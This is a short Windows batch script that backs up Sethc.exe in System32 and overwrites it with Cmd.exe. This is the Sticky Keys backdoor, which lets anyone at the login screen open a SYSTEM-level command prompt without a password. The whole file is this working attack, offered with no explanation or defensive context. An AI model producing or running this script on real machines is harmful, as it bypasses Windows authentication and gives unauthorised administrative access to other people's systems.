@ECHO OFF
TITLE %~n0
SETLOCAL

CD "C:\Windows\System32"

ECHO Create backup
COPY Sethc.exe Sethc.exe.bak

ECHO Overwrite source
COPY /y Cmd.exe Sethc.exe

PAUSE

ENDLOCAL
